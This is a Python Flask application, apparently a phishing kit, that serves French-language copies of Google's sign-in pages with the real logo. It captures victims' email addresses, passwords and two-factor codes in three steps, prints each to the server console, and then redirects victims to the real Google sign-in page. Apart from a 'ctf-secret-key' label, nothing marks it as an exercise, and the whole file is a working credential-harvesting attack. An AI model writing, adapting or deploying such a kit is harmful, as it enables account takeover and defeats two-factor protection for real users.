from flask import Flask, request, render_template_string, session

app = Flask(__name__)
app.secret_key = "ctf-secret-key"

# ============================================================
# ETAPE 1 : Email (style Gmail)
# ============================================================
PAGE_EMAIL = r"""
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connexion</title>
<style>
  @font-face { font-family:'Google Sans'; src:local('Product Sans'); }
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: Roboto, Arial, sans-serif; background:#fff; min-height:100vh; }
  .container { display:flex; min-height:100vh; }
  .left { flex:1; display:flex; align-items:center; justify-content:center; }
  .card { width:450px; padding:48px 40px; }
  .logo { display:flex; justify-content:center; margin-bottom:20px; }
  .logo svg { height:24px; }
  h1 { font-size:24px; font-weight:400; color:#202124; text-align:center; margin-bottom:10px; }
  .subtitle { font-size:16px; color:#202124; text-align:center; margin-bottom:40px; }
  .input-wrap { position:relative; margin-bottom:10px; }
  .input-wrap input {
    width:100%; height:56px; padding:20px 16px 6px; font-size:16px; color:#202124;
    border:1px solid #dadce0; border-radius:4px; outline:none; background:#fff; }
  .input-wrap input:focus { border:2px solid #1a73e8; padding:19px 15px 5px; }
  .input-wrap label {
    position:absolute; left:16px; top:50%; transform:translateY(-50%);
    font-size:16px; color:#5f6368; pointer-events:none;
    transition:all .15s ease; }
  .input-wrap input:focus + label,
  .input-wrap input:not(:placeholder-shown) + label {
    top:10px; transform:none; font-size:12px; color:#1a73e8; }
  .input-wrap input:focus + label { color:#1a73e8; }
  .forgot { display:inline-block; margin:6px 0 30px; color:#1a73e8;
            font-size:14px; font-weight:500; text-decoration:none; }
  .forgot:hover { text-decoration:underline; }
  .info { font-size:14px; color:#5f6368; margin-bottom:30px; }
  .info a { color:#1a73e8; text-decoration:none; font-weight:500; }
  .bottom { display:flex; justify-content:space-between; align-items:center; }
  .create { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; }
  .next { background:#1a73e8; color:#fff; border:none; border-radius:4px;
          padding:10px 24px; font-size:14px; font-weight:500; cursor:pointer; }
  .next:hover { background:#1765cc; box-shadow:0 1px 2px rgba(0,0,0,.3); }
  .footer { position:fixed; bottom:0; left:0; right:0; display:flex;
            justify-content:space-between; padding:12px 24px; font-size:12px; color:#70757a; }
  .footer a { color:#70757a; text-decoration:none; margin-right:24px; }
  .lang select { border:none; font-size:12px; color:#70757a; background:none; }
</style>
</head>
<body>
<div class="container">
  <div class="left">
    <div class="card">
      <div class="logo">
        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.54 12.51-13.44z"/>
          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.54 12.51-13.44z"/>
          <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.88 11.17 7.88 7.31 0 11.84-4.53 11.84-13.07v-3.21h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
          <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
        </svg>
      </div>
      <h1>Connexion</h1>
      <p class="subtitle">Utilisez votre compte</p>
      <form method="POST" action="/check_email">
        <div class="input-wrap">
          <input type="email" id="email" name="email" placeholder=" " required autofocus>
          <label for="email">E-mail ou téléphone</label>
        </div>
        <a href="#" class="forgot">E-mail oublié&nbsp;?</a>
        <p class="info">Ce n'est pas votre ordinateur&nbsp;? Utilisez le mode Invité pour vous connecter en privé. <a href="#">En savoir plus</a></p>
        <div class="bottom">
          <a href="#" class="create">Créer un compte</a>
          <button class="next" type="submit">Suivant</button>
        </div>
      </form>
    </div>
  </div>
</div>
<div class="footer">
  <div class="lang">
    <select>
      <option>Français (France)</option>
      <option>English (United States)</option>
    </select>
  </div>
  <div>
    <a href="#">Aide</a>
    <a href="#">Confidentialité</a>
    <a href="#">Conditions</a>
  </div>
</div>
</body>
</html>
"""

# ============================================================
# ETAPE 2 : Mot de passe (style Gmail)
# ============================================================
PAGE_PASSWD = r"""
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connexion</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: Roboto, Arial, sans-serif; background:#fff; min-height:100vh; }
  .container { display:flex; min-height:100vh; }
  .left { flex:1; display:flex; align-items:center; justify-content:center; }
  .card { width:450px; padding:48px 40px; }
  .logo { display:flex; justify-content:center; margin-bottom:20px; }
  .logo svg { height:24px; }
  h1 { font-size:24px; font-weight:400; color:#202124; text-align:center; margin-bottom:8px; }
  .avatar { display:block; margin:10px auto 8px; width:96px; height:96px;
            border-radius:50%; background:#1a73e8; color:#fff; font-size:40px;
            line-height:96px; text-align:center; font-weight:400; }
  .email-display { font-size:14px; color:#202124; text-align:center; margin-bottom:36px; }
  .input-wrap { position:relative; margin-bottom:10px; }
  .input-wrap input {
    width:100%; height:56px; padding:20px 16px 6px; font-size:16px; color:#202124;
    border:1px solid #dadce0; border-radius:4px; outline:none; background:#fff; }
  .input-wrap input:focus { border:2px solid #1a73e8; padding:19px 15px 5px; }
  .input-wrap label {
    position:absolute; left:16px; top:50%; transform:translateY(-50%);
    font-size:16px; color:#5f6368; pointer-events:none; transition:all .15s ease; }
  .input-wrap input:focus + label,
  .input-wrap input:not(:placeholder-shown) + label {
    top:10px; transform:none; font-size:12px; color:#1a73e8; }
  .checkbox-row { display:flex; align-items:center; margin:12px 0 30px; }
  .checkbox-row input { width:18px; height:18px; margin-right:12px; accent-color:#1a73e8; }
  .checkbox-row label { font-size:14px; color:#202124; }
  .bottom { display:flex; justify-content:space-between; align-items:center; }
  .forgot { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; }
  .next { background:#1a73e8; color:#fff; border:none; border-radius:4px;
          padding:10px 24px; font-size:14px; font-weight:500; cursor:pointer; }
  .next:hover { background:#1765cc; }
  .footer { position:fixed; bottom:0; left:0; right:0; display:flex;
            justify-content:space-between; padding:12px 24px; font-size:12px; color:#70757a; }
  .footer a { color:#70757a; text-decoration:none; margin-right:24px; }
</style>
</head>
<body>
<div class="container">
  <div class="left">
    <div class="card">
      <div class="logo">
        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.54 12.51-13.44z"/>
          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.54 12.51-13.44z"/>
          <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.88 11.17 7.88 7.31 0 11.84-4.53 11.84-13.07v-3.21h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
          <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
        </svg>
      </div>
      <h1>Bienvenue</h1>
      <div class="avatar">{{ initial }}</div>
      <p class="email-display">{{ email }}</p>
      <form method="POST" action="/login">
        <div class="input-wrap">
          <input type="password" id="passwd" name="password" placeholder=" " required autofocus>
          <label for="passwd">Saisissez votre mot de passe</label>
        </div>
        <div class="checkbox-row">
          <input type="checkbox" id="stay" checked>
          <label for="stay">Rester connecté</label>
        </div>
        <div class="bottom">
          <a href="/" class="forgot">Mot de passe oublié&nbsp;?</a>
          <button class="next" type="submit">Suivant</button>
        </div>
      </form>
    </div>
  </div>
</div>
<div class="footer">
  <div>Français (France)</div>
  <div>
    <a href="#">Aide</a>
    <a href="#">Confidentialité</a>
    <a href="#">Conditions</a>
  </div>
</div>
</body>
</html>
"""

# ============================================================
# ETAPE 3 : Code 2FA (style Gmail)
# ============================================================
PAGE_2FA = r"""
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vérification en 2 étapes</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: Roboto, Arial, sans-serif; background:#fff; min-height:100vh; }
  .container { display:flex; min-height:100vh; }
  .left { flex:1; display:flex; align-items:center; justify-content:center; }
  .card { width:450px; padding:48px 40px; }
  .logo { display:flex; justify-content:center; margin-bottom:20px; }
  .logo svg { height:24px; }
  h1 { font-size:24px; font-weight:400; color:#202124; text-align:center; margin-bottom:8px; }
  .avatar { display:block; margin:10px auto 8px; width:96px; height:96px;
            border-radius:50%; background:#1a73e8; color:#fff; font-size:40px;
            line-height:96px; text-align:center; font-weight:400; }
  .email-display { font-size:14px; color:#202124; text-align:center; margin-bottom:36px; }
  .input-wrap input {
    width:100%; height:56px; padding:0 16px; font-size:24px; letter-spacing:12px;
    color:#202124; text-align:center; border:1px solid #dadce0;
    border-radius:4px; outline:none; }
  .input-wrap input:focus { border:2px solid #1a73e8; }
  .info { font-size:14px; color:#5f6368; margin:20px 0 30px; }
  .bottom { display:flex; justify-content:space-between; align-items:center; }
  .other { color:#1a73e8; font-size:14px; font-weight:500; text-decoration:none; }
  .next { background:#1a73e8; color:#fff; border:none; border-radius:4px;
          padding:10px 24px; font-size:14px; font-weight:500; cursor:pointer; }
  .next:hover { background:#1765cc; }
  .footer { position:fixed; bottom:0; left:0; right:0; display:flex;
            justify-content:space-between; padding:12px 24px; font-size:12px; color:#70757a; }
</style>
</head>
<body>
<div class="container">
  <div class="left">
    <div class="card">
      <div class="logo">
        <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.54 12.51-13.44z"/>
          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.54 12.51-13.44z"/>
          <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.88 11.17 7.88 7.31 0 11.84-4.53 11.84-13.07v-3.21h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
          <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
        </svg>
      </div>
      <h1>Vérification en 2 étapes</h1>
      <div class="avatar">{{ initial }}</div>
      <p class="email-display">{{ email }}</p>
      <form method="POST" action="/verify">
        <div class="input-wrap">
          <input type="text" name="otp" maxlength="6" pattern="[0-9]{6}"
                 inputmode="numeric" autocomplete="one-time-code"
                 placeholder="••••••" required autofocus>
        </div>
        <p class="info">Saisissez le code à 6 chiffres envoyé sur votre appareil.</p>
        <div class="bottom">
          <a href="#" class="other">Essayer une autre méthode</a>
          <button class="next" type="submit">Suivant</button>
        </div>
      </form>
    </div>
  </div>
</div>
<div class="footer">
  <div>Français (France)</div>
  <div>Aide · Confidentialité · Conditions</div>
</div>
</body>
</html>
"""

# ============================================================
# PAGE FINALE : succès puis redirection vers le vrai Google
# ============================================================
PAGE_OK = r"""
<!DOCTYPE html>
<html lang="fr"><head><meta charset="utf-8"><title>Connexion</title>
<meta http-equiv="refresh" content="2;url=https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: Roboto, Arial, sans-serif; background:#fff; }
  .card { width:450px; margin:15vh auto; padding:48px 40px; text-align:center; }
  .check { width:72px; height:72px; margin:0 auto 24px; border-radius:50%;
           background:#34a853; color:#fff; font-size:40px; line-height:72px; }
  h1 { font-size:24px; font-weight:400; color:#202124; margin-bottom:8px; }
  p { font-size:14px; color:#5f6368; }
</style></head>
<body>
<div class="card">
  <div class="check">&#10003;</div>
  <h1>Vérification réussie</h1>
  <p>Redirection vers votre boîte de réception...</p>
</div>
</body></html>
"""

@app.route("/")
def step1():
    return render_template_string(PAGE_EMAIL)

@app.route("/check_email", methods=["POST"])
def check_email():
    email = request.form.get("email", "")
    session["email"] = email
    initial = email[0].upper() if email else "?"
    print(f"\n[+] EMAIL        ->  {email}")
    return render_template_string(PAGE_PASSWD, email=email, initial=initial)

@app.route("/login", methods=["POST"])
def login():
    email = session.get("email", "?")
    pwd = request.form.get("password", "")
    initial = email[0].upper() if email != "?" else "?"
    print(f"[+] MOT DE PASSE  ->  {pwd}")
    return render_template_string(PAGE_2FA, email=email, initial=initial)

@app.route("/verify", methods=["POST"])
def verify():
    otp = request.form.get("otp", "")
    print(f"[+] CODE 2FA      ->  {otp}")
    return render_template_string(PAGE_OK)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8081, debug=False)
